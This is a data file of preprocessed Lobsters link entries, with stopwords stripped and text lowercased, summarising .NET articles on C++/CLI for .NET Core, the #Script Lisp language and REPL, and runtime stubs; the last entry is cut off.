114,Lobsters,dotnet,"C#, F#, .NET programming",C++ is Coming to .NET Core for Windows,https://www.infoq.com/news/2019/10/CPP-CLI-NetCore/,c coming net core window,ccli net core ccli managed extension c han passant explains cnet language ccx cwinrt cppcon kenny kerr james mcnellis embracing standard c window runtime,microsoft announced plan offer ccli net core would offered window application able use ccli linux osx ccli microsoft second attempt creating version c target net created replaced managed extension c purpose allow developer freely mix managed ie net object traditional c object first use case come mind interoperability vb c directly call native dlls com component library always offer appropriate api wrapping ccli library abstraction put place hide incompatibility another use direct hardware access working hardware developer often need carefully manipulate unmanaged memory c allows unsafe block limited degree c hand use inline assembly get around languagebased limitation restriction han passant explains ccli compiler support generating machine code il generate machine code code compiled without clr effect function bracketed pragma managed push pragma managed pop function must compiled machine code contain code translated il like asm note warning got first snippet suppress warning pragma managed code use managed type course unit code generation function work function need main function must compiled il us managed type function wo nt inlined course presumably microsoft visual c compiler target window ccli likewise target window mixing native il code would require platformspecific compiler operating system impossible goal ccli standardized theory llvm gcc could adopt extension offer linux osx version cnet language ccli still viable option microsoft last attempt part window winrt initiative microsoft created ccx resembles ccli syntax designed specifically work winrt version com ccx replaced cwinrt unlike language discussed article cwinrt extension c based c developer write normal c code still accessing winrtcom infrastructure information see cppcon kenny kerr james mcnellis embracing standard c window runtime
115,Lobsters,dotnet,"C#, F#, .NET programming",#Script Lisp,https://sharpscript.net/lisp/,script lisp,script lisp syntax fit post card lisp greatest single programming language ever designed equation software lisp unprecedented elegance simplicity myriad dialect lispy peter norvig line python code zick standard lisp zick different language recursive lisp evaluator lisp line code nukata lisp suzuki hisao small standard library script lisp overview scriptlisp nukata lisp language block expression scripting net type script method simplified common lisp reference clojure data list map anonymous function java interop keyword syntax indexing collection lisp repl x app net core annotated repl walk sharp script sharp apps script page sandbox redis sharp app appsettings enable feature access resource appsettings sharp apps gist desktop apps pure cloud app appsettings database script virtual file virtual file system apis plugins appsettings servicestack plugins lisp repl tcp server programmable gateway debug inspector techstacksio loopback scriptnamespaces rlwrap script page scripting net type techstacks tcp lisp repl demo techstacksio parser hacker news r feed hn current top link db script admin publishmessage mq server password protection redis security model redis auth configured authsecret annotated lisp tcp repl transcript run watch lisp script sharp script run watch lisp interpreter new lisp interpreter fresh watch script sharp script annotated lisp watch script page argument executing lisp net sandboxed finer grained control evaluating lisp script result auto mapping utils net interop java interop scripting net type resolution member access property instance field instance method instance args indexer access key indexer string key dictionary n list n array n enumerable n indexer property instance field instance constructor access suffix type args namespacetype args new script method new type args new type args static member access statictypeproperty statictypefield statictypeconst statictypemethod args namespacestatictypemember namespacestatictypeinnertypemember script method argument binding script method scriptmethod args methodasbinding generic type statictypemethod genericstatictype member genericstatictype method generictype unquoting constructor function c tuple string int string int c tuple string int string int c tuple string int string int function f tuplecreate string int string int f tuplecreate string int string int scripting net type property setter set script method set instance prop arg lisp list v net collection con cell builtin lisp function annotated net interop example importing global script sexpression con cell loading script virtual file provider script page memoryvirtualfiles import script url deno locally cached deno import script gist script lisp library index script lisp library index gist index comment viewing script source code disable remote import script page integration several attempt create html dsl lisp syntax template mode script block code language block expression implementation single page ast language block expression lisp argument scope code exporting lisp function defn script block controlling lisp output everything expression setq language block modifier print args println args new line printlns args space delimiter new line pr args html encode prn args html encode dorun dorun learn script lisp c linq example lisp explore apis realtime watched lisp script lisp repl symbol standard lisp clojure function symboltype symbol scriptmethods scriptmethodtypes joinln collection globln pattern collection typename instance prop instance field instance method instance proptypes instance fieldtypes instance methodtypes instance staticprops instance staticfields instance staticmethods instance staticproptypes instance staticfieldtypes instance staticmethodtypes instance script api reference script documentation implementation predicate core lisp predicts,script lisp script designed small expressive wristfriendly dynamic scripting language maximum familiarity modelled world popular ubiquitous scripting language javascript minimal syntax inspired small powerful language heavily utilizes function instead adopting larger language grammar defining different bespoke syntax language construct small language like smalltalk despite one influential language history famous minimal syntax fit post card language arguably better power size ratio lisp inventor smalltalk alan kay credited greatest single programming language ever designed realizing half page code bottom page lisp equation software lisp unprecedented elegance simplicity spawned myriad dialect noteworthy implementation illustrating beauty small size expressive power lispy peter norvig director google research implement lisp interpreter line python code inc repl another compact dialect zick standard lisp zick implemented different language including recursive lisp evaluator lisp implemented line code complete lisp implementation c elegant nukata lisp suzuki hisao common lisplike dialect tail call optimization partially hygienic macro although notable limitation including small standard library us double numeric type nt contain net scripting support script lisp overview scriptlisp enhanced version nukata lisp number new feature reuses script existing scripting capability provide seamless integration rest script see language block expression net including scripting net type support net numeric type access comprehensive library script method optimally designed accessing net functionality dynamic language improve compatibility existing common lisp source code also implement simplified common lisp reference well missing function required implement c linq example lisp improve readability familiarity also adopts number clojure syntax defining data list map literal anonymous function syntax java interop net interop keyword syntax indexing collection accessing index accessors clojure popular shorter alias fn def defn improving sourcecode compatibility clojure lisp repl addition class language option script lisp dynamism extensibility make particularly well suited explanatory programming whose access via repl built latest x app dotnet tool quickly installed window macos linux o net core dotnet tool install g x previous version installed update latest version dotnet tool update g x able bring instant lisp repl x lisp quick demo show kind exploratory programming available query scriptmethods available query object prop query lisp interpreter global symbol table containing global state including defined lisp function macro variable video annotated repl walk annotated version demo explains different expression like sharp script sharp apps lisp repl run within script page scriptcontext sandbox run sharp app folder start net core app server simulates fully configured net core app case running redis sharp app directory able access static web asset well redisserver connection configured appsettings quick lisp test list scriptmethodinfo scriptcontext running lisp interpreter access scriptmethods first script method scriptmethods show public property scriptmethodinfo prop scriptmethods show property per line joinln prop scriptmethods show property type name joinln proptypes scriptmethods view name avaialble script method joinln map name scriptmethods view script method starting globln map name scriptmethods view script method starting env globln env map name scriptmethods print environment info machine seperated space printlns envosversion envmachinename envframeworkdescription envlogicaldrives expand logical drive printlns envosversion envmachinename envframeworkdescription drive join envlogicaldrives view current global symbol defined lisp interpreter symbol view symbol starting c globln c symbol see many symbol defined interpreter count symbol see many script method available count scriptmethods view method signature script method starting globln map signature scriptmethods count file accessible configured scriptcontext count allfiles view public property first ivirtualfile prop allfiles display virtualpath available file joinln map virtualpath allfiles display method signature script method starting findfiles globln findfiles map signature scriptmethods see many html file available app count findfiles html see many j file available app count findfiles j show virtualpath html file joinln map virtualpath findfiles html view virtualpath html file map virtualpath findfiles html map virtualpath findfiles html view text file content html file filetextcontents map virtualpath findfiles html filetextcontents map virtualpath findfiles html display method signature script method starting redis globln redis map signature scriptmethods search redis key starting urn redisserver instance app configured redissearchkeys urn display first redis search entry redissearchkeys urn display key name redis key starting urn joinln map id redissearchkeys urn find redisserver data type urn tag key rediscall type urn tag view tag urn tag sorted set rediscall zrange urn tag view string content urn key rediscall get urn parse json content question display tag name tag parsejson rediscall get urn extract tag question tag parsejson rediscall get urn clear console screen clear exit lisp repl quit enable feature access resource appsettings configure lisp repl resource feature sharp apps gist desktop apps access creating plain text appsettings file feature resource want lisp repl access eg pure cloud app appsettings allows lisp repl use database script aws postgresql rds server query remote virtual file using virtual file system apis note value prefixed resolved environment variable name aws postgresql web app db postgres dbconnection awsrdspostgres file filesconfig accesskey secretkey region bucket rockwind see plugins appsettings example load configure servicestack plugins lisp repl tcp server addition launching lisp repl console also open lisp repl servicestack app configured lisprepltcpserver servicestack plugin effectively open programmable gateway servicestack app able perform live query access ioc dependency invoke internal server function query state running server like debug inspector provide invaluable insight diagnosing issue remote server see action enable one production apps techstacksio vuetify spa app configured empty sharppagesfeature nt use serverside scripting feature enable debugmode enable setting debugmode app appsettingsproductionjson launch tcp socket server default configured listen loopback ip port configdebugmode pluginsadd new lisprepltcpserver scriptmethods new dbscripts scriptnamespaces nameof techstacks nameof techstacks nameof serviceinterface nameof techstacks nameof servicemodel scriptnamespaces behaves like c using namespace statement letting reference type name instead fullyqualified namespace whilst connect basic telnet much nicer experience use rlwrap readline wrap utility provides enhanced experience line editing persistent history completion sudo aptget install rlwrap open tcp connection connect new lisp repl rlwrap telnet localhost full scriptability running server allowed script page sharppagesfeature allows scripting net type default techstacks tcp lisp repl demo demo explore possibility scripting live techstacksio server resolve ioc dependency send tweet using registered itwitterupdates dependency view source load remote parser lisp function new lisp interpreter attached tcp connection use parse hacker news r feed net collection easily queried using builtin function used construct email body hn current top link us db script explore configured aws rds postgresql rdbms listing db table viewing column name definition retrieving email address admin user sending email hn top link publishing sendemail request dtos using publishmessage servicestack script processed background configured mq server us execute sendemail servicestack service us configured aws s smtp server finally send email video password protection since tcp server effectively open remote server scripted want ensure tcp server accessible within trusted network effectively treating redis security model secure approach would leave default binding ipaddressloopback trusted user ssh access able access still able access remotely via local pc ssh telnet like redis auth also add password protection additional layer security pluginsadd new lisprepltcpserver requireauthsecret true allow access user configured authsecret setconfig new hostconfig adminauthsecret secretz annotated lisp tcp repl transcript resolve itwitterupdates ioc dependency assign twitter def twitter resolve itwitterupdates view concrete type name typename twitter view method name joinln method twitter view method signature joinln methodtypes twitter use send tweet webstacks account tweet twitter using script lisp http sharpscriptnetlisp view available script script lisp library index gistindex view source code parser library loadsrc index parser assign xml content hn r feed xml def xml urlcontents http newsycombinatorcomrss preview first char substring xml use parser parse r feed net collection assign r def r parser xml view title description first item r feed title r description r item r view link r feed item joinln map link item r view link title top news item joinln map link take item r joinln map title take item r construct plaintext numbered list top hn link assign body joinln mapindex str title take item r joinln mapindex str padleft title take item r def body joinln mapindex str padleft title n link n take item r view techstacks postgresql aws rds table dbtablenames joinln dbtablenames view column name definition technology table joinln dbcolumnnames technology joinln dbcolumns technology search user table globln user dbtablenames view many admin user email dbscalar select count email customuserauth role like admin assign admin user email email list def email map email dbselect select email customuserauth role like admin search operation script method globln operation scriptmethods search email request dtos globln email metaalloperationnames view property available sendemail request dto prop sendemail search publish script method publish message globln publish scriptmethods create publish sendemail request dtos processing techstacks configured mq server doseq email publishmessage sendemail subject top hn link body body run watch lisp script sharp script functionality script also available lisp script use web app dotnet tool run watch standalone lisp script l file extension eg x run lispl x watch lispl clarify behavioural difference lisp repl us lisp interpreter maintain state change across command watch script run new lisp interpreter start fresh copy global symbol table state change ctrls save point discarded watch lisp script quick demo illustrates functionality sharp script also available lisp script provides instant feedback whilst develop realtime video annotated lisp watch script db sqlite dbconnection northwindsqlite file filesconfig accesskey secretkey region bucket rockwind delete removetxt file sh str iswin del rm removetxt view northwindsqlite rdbms table textdump dbtablenames caption northwind display first customer row single row view showing table column textdump dbselect select customer limit display customer london def city london textdump dbselect select id companyname contactname customer city city city city view root file folder configured virtual file provider joinln map str name allrootdirectories vfscontent joinln map name allrootfiles vfscontent show first png file vfs provider def pattern first argv png joinln map virtualpath take findfiles vfscontent pattern page argument also use syntax declaring appsettings page argument used script code script db sqlite dbconnection northwindsqlite compatibility lisp syntax highlighter code editor also prefixed line comment seen executing lisp net lisp like script language executed within scriptcontext defines functionality available ie var context new scriptcontext args global argument available script page partial etc scriptmethods additional method scriptblocks additional script block filtertransformers additional stream transformer pageformats additional text document format plugins encapsulated feature eg markdown protected servicestack feature scantypes auto register method block code page type scanassemblies auto register method block code page type assembly init customize pure sandboxed scriptcontext script executed within extending render lisp first need register lisp language scriptcontext using var context new scriptcontext scriptlanguages scriptlisplanguage init use renderlisp ie instead renderscript render lisp code eg render lisp var output contextrenderlisp dateformat hh mm s async var output await contextrenderlispasync dateformat hh mm s apis match highlevel apis rendering normal script var output contextrenderscript dateformat hh mm s var output await contextrenderscriptasync dateformat hh mm s finer grained control highlevel apis wrap finergrained functionality work rendering sharppage configured lisp language pageresult language use var context new scriptcontext scriptlanguages scriptlisplanguage init var dynamicpage contextlispsharppage dateformat hh mm s render lisp var dynamicpage contextsharpscriptpage dateformat hh mm s render script var output new pageresult dynamicpage renderscript async var output await new pageresult dynamicpage renderscriptasync need return value instead access var result new pageresult dynamicpage evaluateresult var returnvalue scriptlanguageunwrapvalue returnvalue null script source code nt change reuse dynamicpage let reevaluate source code cached ast evaluating lisp script result instead wanted access return value instead rendered output use evaluatelisp apis var result contextevaluatelisp return generic overload utilizes servicestack auto mapping utils convert return value preferred type eg double result contextevaluatelisp double return string result contextevaluatelisp string return also used powerful conversion like converting object dictionary preferred poco var result contextevaluatelisp customer return dbsingle select customer id id id id new objectdictionary id net interop syntax net interop inspired directly clojure syntax used java interop see scripting net type resolution configure type imported namespaces want lisp script access member access prefix accessing instance member used retrieving property public property field invoking instance method eg property instance field instance method instance args indexer access use prefix accessing type indexer indexing collection eg key indexer string key dictionary n list n array n enumerable n indexer also used access instance public property field property instance field instance however readability recommend using prefix convey instance member access constructor access use suffix creating instance type type args namespacetype args also create instance using new script method accepts string type name used create generic class multiple generic args eg new type args new type args static member access use separator access type static member invoke static method eg statictypeproperty statictypefield statictypeconst statictypemethod args use dot notation specifying fullyqualified type name reference inner class eg namespacestatictypemember namespacestatictypeinnertypemember script method use prefix reference script method registered scriptcontext script method without argument referenced argument binding referenced argument ie without bracket implicitly evaluated ineffect making calculated property prefix indicates reference script method readability excluded existing symbol defined lisp interpreter symbol table fallback referencing script method scriptmethod args methodasbinding mean exists symbol name defined need use prefix reference script method generic type reference support referencing generic type method single generic type argument eg statictypemethod genericstatictype member genericstatictype method generictype one lisp syntax token unquoting prevents able use specify multiple generic argument instead need use constructor function referencing constructor multiple generic argument also need specify type exact constructor want call eg c tuple string int string int difference c script method constructor function lisp c function script method return reference constructor need invoke argument create instance c tuple string int string int whilst lisp c function autoinvoke constructor function supplied argument single expression c tuple string int string int likewise needing invoke generic method multiple generic args need use function f tuplecreate string int string int script lisp f function invoking function reference single expression f tuplecreate string int string int example information see scripting net type property setter populate multiple property instance using set script method eg set instance prop arg alternatively property set individually lisp list v net collection potential source friction interoperating net lisp list con cell code data list lisp ie implemented linked list con cell null lisp core function expect operate namely car cdr caar cadr cdar cddr caaar caadr cadar caddr cdaar cdadr cddar cdddr append mapcar consp con listp list memq member assq assoc nreverse last nconc dolist dotimes mapcan mapc nthcdr nbutlast core lisp function ca nt used net collection directly instead use tocons collection convert net ienumerable collection con list eg cdr tocons netenumerable need inverse use tolist conslist convert con list net list eg tolist range made script lisp con cell ienumerable builtin lisp function operate con cell net collection instead iterating list dolist use doseq iterate net collection con cell eg doseq x collection println x annotated net interop example see look like action annotated simple realworld example heavily utilizes net interop define function assign parser value lisp interpreter symbol table defn parser xml define local variable used within scope let doc channel item el use xdocumentparse parse xml string argument containing xml assign doc def doc systemxmllinqxdocumentparse xml create empty objectdictionary wrapper dictionary string object assign def objectdictionary create empty list objectdictionary assign item def item list objectdictionary descend first channel xml element assign channel def channel first descendant doc channel use xlinqextensionsfirstelement extension method assign channel first xml element el def el xlinqextensionsfirstelement channel iterate element first item add toplevel entry localname name el item add current xml element name value entry add localname name el value el move next element using xlinqextensionsnextelement extension method def el xlinqextensionsnextelement el add r item item list iterate channel child item xml element doseq elitem descendant channel item create empty objectdictionary assign item def item objectdictionary use xlinqextensionsfirstelement assign item first xml element el def el xlinqextensionsfirstelement elitem el add current xml element name value entry item add item localname name el value el move next element using xlinqextensionsnextelement extension method def el xlinqextensionsnextelement el add item objectdictionary item list add item item add item objectdictionary list key item add item item return objectdictionary comparison would equivalent implementation c public static objectdictionary parser string xml var new objectdictionary var item new list objectdictionary var doc xdocumentparse xml var channel docdescendants channel first var el channelfirstelement elname item elnamelocalname elvalue el elnextelement var elitems channeldescendants item foreach var elitem elitems var item new objectdictionary el elitemfirstelement el null item elnamelocalname elvalue el elnextelement itemsadd item item item return importing global script importing script lisp essentially process parsing lisp source code sexpression basically lisp ast tokenized element captured con cell evaluating lisp interpreter defined symbol captured symbol table lisp script capture standard library global interpreter serf starting template lisp interpreter start copy global symbol table populate common function using lispimport eg lispimport defun fib n n fib n fib n loading script loading script within lisp script work similarly except loaded lisp interpreter symbol table new one created new pageresult script loaded locally loaded scriptcontext configured virtual file provider script page sharppagesfeature configured use app cascading virtual file source new scriptcontext start empty memoryvirtualfiles write file var context new scriptcontext scriptlanguages scriptlisplanguage scriptmethods new protectedscripts contextvirtualfileswritefile defn libcalc b b contextvirtualfileswritefile defn libcalc b b contextinit load script symbol name assumes l extension quoting argument lisp nt try evaluate argument eg load libcalc alternatively specify virtual path script load multiple script definition lisp update value assigned symbol name latest definition eg load libcalc load libcalc import script url inspired deno also import remote script url eg load http exampleorglibl locally cached like deno remote resource cached first use loaded load locally cached version script still work airplane without internet connection cache maintained lisp folder configured virtual file provider deleted clear cache sharp script apps using web app dotnet tool stored cache folder cleared x clean import script gist also firstclass support gist reference gist gistid eg load load gist file gist order load single file gist specify load script lisp library index provide human readable name remote lisp script discoverable catalog anyone share script reference gist name listed script lisp library index selfdocumenting machine human readable gist named link external gist maintained respective author index library reference loaded using format index name eg also support able reference individual gist file load index like share lisp script everyone publish library index add link gist preferred name gist index comment viewing script source code view source code load script reference loadsrc eg loadsrc lib loadsrc loadsrc http exampleorglibl loadsrc loadsrc index libcalc disable remote import wish prevent anyone loading remote script lispallowloadingremotescripts false script page integration whilst lisp small powerfully expressive functional dynamic language great use templating language whilst several attempt create html dsl lisp nothing better syntax default template mode script emit everything template language expression verbatim text nice usp script lisp never forced going full lisp utilize script template expression script block handlebar syntax provides ideal dsl usage template language generating html utilize preferred lisp code script language computational logic want included page using language block expression implementation despite implemented different language script page containing multiple language eg still produce single page ast first loaded script par page content contiguous readonlymemory char page slice language block expression page delegated scriptcontext registered scriptlanguages parsing return fragment added page ast executing page language responsible rendering fragment write directly page outputstream generate page output multilanguages support script designed extensible everything language encapsulated within scriptlanguage implementation omit registration var context new scriptcontext scriptlanguages scriptlisplanguage init language expression language block referencing become inert source code emitted plaintext lisp argument scope one differentiator lisp code language code utilizes containing page current scope argument reference lisp store definition within lisp interpreter symbol table attached pageresult whilst lisp script access argument within page scope order outer page access lisp symbol need exported eg exporting lisp function lisp function also exported usage rest page calling todelegate lispfn convert net delegate eg although easier way define function lisp use defn script block wrap convenient syntax controlling lisp output one lisp famous trait everything expression typically desired within language may want generating output eg traditionally lisp us setq set variable also return value script emit automatically emits statement return value could use def alias setq return null option include wrapping statement within empty let expression last expression returned could use language block modifier ignore entire lisp block output export result want able control precisely emit use either q quiet mute block modifier ignore output another way generate output lisp use builtin print function print args write argument outputstream println args write argument outputstream followed new line printlns args write argument outputstream space delimiter followed new line pr args print html encode argument prn args println html encode argument dorun dorun used executing statement block sequence expression sideeffects want discard return type akin void return type dorun println map fizzbuzz range use return last expression statement block nil null null learn script lisp great resource learning script lisp seeing action seeing implement c linq example lisp explore apis realtime also take advantage lisp dynamism interactivity explore apis realtime great way via watched lisp script side provides instant feedback ctrls save point active lisp repl symbol list symbol lisp interpreter symbol named standard lisp clojure function symboltype symbol display symbol value type scriptmethods list available script method name registered scriptcontext scriptmethodtypes list available script method type information joinln collection display string output item collection separate line globln pattern collection display line matching glob pattern typename instance view instance type name prop instance display property name instance public property field instance display field name instance public field method instance display method name instance public method proptypes instance get propertyinfo instance public property fieldtypes instance get fieldinfo instance public field methodtypes instance get script method info instance public method staticprops instance display property name instance public static property staticfields instance display field name instance public static field staticmethods instance display method name instance public static method staticproptypes instance get propertyinfo instance public static property staticfieldtypes instance get fieldinfo instance public static field staticmethodtypes instance get script method info instance public static method view script api reference script documentation website interactively explore available apis work providing interactive documentation builtin lisp function meantime best resource implementation reference quick list builtin lisp symbol gensymcounter version append nreverse ab append apply assoc assockey assocvalue assq atom atom average butlast c caaar caadr caar cadar caddr cadr car cdaar cdadr cdar cddar cdddr cddr cdr ceiling con con consp co count debug dec decf def defmacro defn defun dispose dolist dorun doseq doseqwhile dotimes dump dumpinline elt empty end endp enumerator enumeratorcurrent enumeratornext eq eql equal error even every every exit exp expt f f false filter filterindex first flatmap flatten floor gensym glob globln groupby htmldump identity inc incf instance intern isqrt last length let letrec list list listp load loadsrc logand logior logxor lowercase makesymbol map mapc mapcan mapcar mapindex mapwhere max member memq min mod nbutlast nconc new newmap next nreverse nth nthcdr null number odd orderby pop pr princ print println printlns prn pr push pushend random range reduce remove removeif rest return reverse round rplaca rplacd second seq setcar setcdr setdifference set sin skip skipwhile sort sortby sqrt str string string stringdowncase stringupcase subseq sum symbolname symboltype take takewhile tan terpri textdump third toarray tocons todelegate todictionary tolist true truncate union unless uppercase whereindex zero zerop zip zipwhere common lisp convention us p suffix predicate function prefer clojure ruby readable suffix convention sourcecode compatibility include core lisp predicts others
116,Lobsters,dotnet,"C#, F#, .NET programming",“Stubs” in the .NET Runtime,http://www.mattwarren.org/2019/09/26/Stubs-in-the-.NET-Runtime/,stub net runtime,stub net runtime david wheeler stub thunk mention table content stub tidyup fixup later post virtual method delegate generic stub needed required functionality performance consistent method call clr application binary interface abi application binary interface abi calling convention calling convention system v abi extended abi pointer managed pointer treated like new kind argument covered native abi generic case code address uniquely identify generic instantiation method generic instantiation parameter required generic parameter passed additional argument hidden parameter share il stub based signature right method show call stack exception stub management coreclr source every clr developer must know writing code code compatible managed debugging sourcelevel stepin debugger sourceline call sourceline call stubmanagers see srcvmstubmgrh so command net generic code bloat lack thereof virtual call dispatch type stub section code section botr kind methoddescs instantiating pinvoke ndirect fcall array eeimpl com interop unboxing precode method descriptor efficient wrapper stub efficient stub wrapper spaceefficient wrapper stub multiplex multiple caller methoddesc class methodtable eeclass botr page vmprecodeh botr page stubprecode fixupprecode thisptrretbufprecode ndirectimportprecode comment justintime jit tiered compilation botr page temporary entry point technique lazy approach jitting jiting jiting jiting tiered compilation tiered compilation code patch vtable slot similar tiering enabled vmprestubcpp stubsasil intermediate language net framework starting net framework converting stub generated jit runtime generates il stub jit compiles il regular method code code vmilstubresolverh enable featurearraystubasil switch multicast delegate stub window use stubsasil fix generateshufflearray support cyclic shuffle comment pinvoke reverse pinvoke callus clr abi pinvokes il stub nonil stub il stub come actual callpinvoke nonil stub il stub il stub stack walking unwinding vmframesh il stub wired ndirect vmdllimportcpp vmclrtocomcallcpp kind methoddescs opcodescalli version large number pinvoke stub created startup readytorun image ngen native image generator ilstubs enable compilationinlining pinvoke stub marshalling required pinvoke stub unix platform marshalling microsoft doc improvement interop marshaling il stub everywhere history directly generated assembly instruction generating specialized ml internal marshaling language internal interpreter continued strategy would create parallel marshaling infrastructure new architecture supported remember introduced support would addition initial cost least triple cost every new marshaling feature bug fix implement struct marshalling via il stub instead via fieldmarshalers pinvoke beyond magic compile time marshalling see stub runtime generates generic one method body different reason outlined jon skeet comment instantiated generic method perinstantiation static method vmprestubcpp note ascii art comment delegate delegate c programming guide net delegate work vmcomdelegatecpp open delegate v closed delegate jit know time generates code delegate point shuffle thunk instead need add pointer first argument register need move first argument register second second third last stack obviously right order nothing get overwritten singlecast delegate multicast variant true window version delegateobject shuffle thunk infinite loop generateshufflearray pr corrupted struct passed delegate constructed via reflection fix shuffling thunk unix version arm version one unboxing look internals boxing clr key diagram stack heap disabled enabled generic instantiation informative comment array beginning stubsasil lower use unsigned index extension muldidimensional array stub tail call tail call jit condition tail call improvement net framework sharplab design doc fast tail call tail call using helper generate assembler argument copying routine design doc vmjithelperscpp vmjitinterfacecpp following pseudo code design doc explains expensive port new platform slower stack walking stack frame tail call requires runtime assistance could implemented implement portable tailcall helper virtual stub dispatch vsd botr page devoted technique using stub virtual method invocation instead traditional virtual method table motivation stub dispatching eliminate much related working set well distribute remaining work throughout lifetime process currently used interface dispatch il interface method vmvirtualcallstubh lookup stub dispatch stub dispatchstubshort dispatchstublong comment resolve stub vtable virtual call stub design virtual stub dispatch comment simple devirtualization jit devirtualization next step type stub jump stub function pointer stub vmfptrstubscpp vmfptrstubsh thread hijacking stub botr page threading stub stub stub vmthreadsuspendcpp ngen fixup stub clr inside performance benefit ngen crossassembly reference need go jump slot get populated correct address run time executing method prestub native image assembly referenced method loaded memory method executed ngen section stub mono runtime widely used trampoline jit trampoline virtual call trampoline jump trampoline class init trampoline generic class init trampoline rgctx lazy fetch trampoline aot trampoline delegate trampoline monitor enterexit trampoline generic sharing conclusion shared possible even hairy even complex anyone read far want fun challenge try figure stub force single method call go via let know comment via twitter,stub net runtime sep word saying go problem computer science solved another level indirection david wheeler certainly seems like net runtime engineer took advice heart stub known runtime sometimes thunk provide level indirection throughout source code almost mention post explore work needed table content stub context net runtime stub look something like callsite callee stub sit method callsite ie code var result foo callee method implemented nativeassembly code like think tidyup fixup work note moving stub callee another full method call hence dotted line often single jmp call assembly instruction transition involve work initially done callsite pushingpopping argument register increasing stack space etc stub simple assembly instruction something complicated look individual example later post clear method call require stub regular call static instance method go directly callsite callee involve virtual method delegate generic thing get bit complicated stub needed several reason stub need created runtime required functionality performance consistent method call final factor stub make work jit compiler easier see rest post stub deal variety different type method call mean jit generate straightforward code given call site mostly care whats happening callee stub exist given method call jit would generate different code depending whether generic involved virtual nonvirtual call going via delegate etc stub abstact lot behaviour away jit allowing deal simple application binary interface abi clr application binary interface abi therefore another way think stub part make clrspecific application binary interface abi work code need work abi calling convention cpuos running instance following calling convention calling convention system v abi applies across runtimes see aside want information calling convention link found useful however ontop clr support due cpuos convention also extended abi netspecific use case including pointer managed pointer treated like new kind argument covered native abi chose always pas first argument rcx arm net framework managed pointer treated like native pointer meaning second argument call used return buffer passed rdx instead rcx starting net framework always first argument generic specifically handle shared generic case code address uniquely identify generic instantiation method generic instantiation parameter required often pointer serve dualpurpose instantiation parameter pointer generic parameter generic parameter passed additional argument hidden parameter covering stub dispatch fast pinvoke callus pinvoke normal pinvoke instance pinvoke hidden parameter normal pinvoke vm share il stub based signature want right method show call stack exception methoddesc exact pinvoke passed eax arm jit regsecretstubparam il stub jit get corjitflgpublishsecretparam must move register compiler temp scenario need stub instance pointer handled directly jit many see rest post stub management seen stub needed type functionality provide look specific example exist coreclr source wanted take time understand common shared concern apply stub stub clr snippet assembly code stored memory lifetime managed also play nice debugger every clr developer must know writing code code compatible managed debugging add new stub way call managed code make sure sourcelevel stepin debugger debugger psychic sourcelevel stepin need able go sourceline call sourceline call managed code developer confused make call transition giant line stub must cooperate debugger know stepthrough stubmanagers see srcvmstubmgrh try stepin new codepath debugger every type stub stubmanager deal allocation storage lookup stub lookup significant provides mapping arbitrary memory address type stub created code example checkisstubinternal method dotracestub method look like delegateinvokestubmanager bool delegateinvokestubmanager checkisstubinternal pcode stubstartaddress limitedmethoddaccontract bool fisstub false ifndef daccesscompile ifndef fisstub fisstub stubstartaddress geteefuncentrypoint singlecastdelegateinvokestub endif endif daccesscompile fisstub fisstub getrangelist isinrange stubstartaddress return fisstub bool delegateinvokestubmanager dotracestub pcode stubstartaddress tracedestination trace limitedmethodcontract log lfcordb lleverything delegateinvokestubmanager dotracestub calledn asserte checkisstubinternal stubstartaddress mc delegate want set bp contextful manager push figure call single multicast delegate multi multicast delegate trace initformanagerpush stubstartaddress logtracedestination trace stubstartaddress delegateinvokestubmanager dotracestub return true code initialise various stub manager systemdomain attach working list get sense category stub plus informative comment code help precodestubmanager implemented stub manager function globals delegateinvokestubmanager implemented since generate delegate invoke stub runtime use stublinkstubmanager stub instead create additional delegateinvokestubmanager instead jumpstubstubmanager implemented stub manager jump stub created executionmanager jumpstub currently used target rangesectionstubmanager implemented stub manager code section forward query appropriate stub manager handle query ilstubmanager implemented stub manager il stub interopdispatchstubmanager implemented used recognize genericcompluscallstub varargpinvokestub genericpinvokecallihelper stublinkstubmanager implemented thunkheapstubmanager implemented note reason stub manager recgonize umentrythunks istransitionstub tailcallstubmanager implemented stub manager help managed debugger step tail call help debugger trace jittailcall stubmgrh theprestubmanager implemented prestubcpp following code manages prestub method stub initially use prestub virtualcallstubmanager implemented virtualcallstubcpp finally also see stubmanagers action use eeheap so command inspect heap dump net process help report size different stub heap eeheap loader loader heap system domain lowfrequencyheap size byte highfrequencyheap size byte stubheap size byte virtual call stub heap indcellheap size byte lookupheap size byte resolveheap size byte dispatchheap size byte cacheentryheap size byte total size byte output taken net generic code bloat lack thereof see case entire stub heap taking byte addition indepth statistic covering heap used virtual call dispatch type stub different stub used runtime fall main category stub wired methoddesc doprestub section code section com interop stub generated include following definition taken botr kind methoddescs also see enum methodclassification instantiating featuresharegenericcode default makeinstantiatingstubworker used le common il method generic instantiation preallocated slot method table pinvoke aka ndirect getstubforinteropmethod pinvoke method method marked dllimport attribute fcall method ecall getfcallimpl internal method implemented unmanaged code method marked methodimplattribute methodimploptionsinternalcall attribute delegate constructor tlbimp constructor array method generatearrayopstub array method whose implementation provided runtime get set address eeimpl pcode comdelegate getinvokemethodstub eeimplmethoddesc pmd delegate method implementation provided runtime com interop featurecominterop default getstubforinteropmethod com interface method since nongeneric interface used com interop default kind usually used interface method unboxing stub makeunboxingstubworker methoddesc pmd right let look individual stub detail precode first take look precode stub used type stub explained botr page method descriptor precode small fragment code used implement temporary entry point efficient wrapper stub precode niche codegenerator two case generating efficient code possible ideal world native code dynamically generated runtime would produced jit feasible case given specific requirement two scenario basic precode may look like mov eax pmethoddesc load methoddesc scratch register jmp target jump target efficient stub wrapper implementation certain method eg pinvoke delegate invocation multi dimensional array setter getters provided runtime typically handwritten assembly stub precode provides spaceefficient wrapper stub multiplex multiple caller worker code stub wrapped precode fragment mapped methoddesc jump worker code stub worker code stub shared multiple method way important optimization used implement pinvoke marshalling stub providing pointer methoddesc class precode allows subsequent stub access lot information method call containing type via methodtable hot eeclass cold data structure methoddesc datastructure one fundamental type runtime hence botr page precode created methoddesc getorcreateprecode several different type see enum vmprecodeh enum precodetype precodeinvalid invalidprecode type precodestub stubprecode type ifdef hasndirectimportprecode precodendirectimport ndirectimportprecode type endif hasndirectimportprecode ifdef hasfixupprecode precodefixup fixupprecode type endif hasfixupprecode ifdef hasthisptrretbufprecode precodethisptrretbuf thisptrretbufprecode type endif hasthisptrretbufprecode always botr page describes different type great detail summary stubprecode basic precode type load methoddesc scratch register jump must implemented precodes work used fallback specialized precode type available fixupprecode used final target require methoddesc scratch register fixupprecode save cycle avoiding loading methoddesc scratch register common usage fixupprecode method fixups ngen image thisptrretbufprecode used 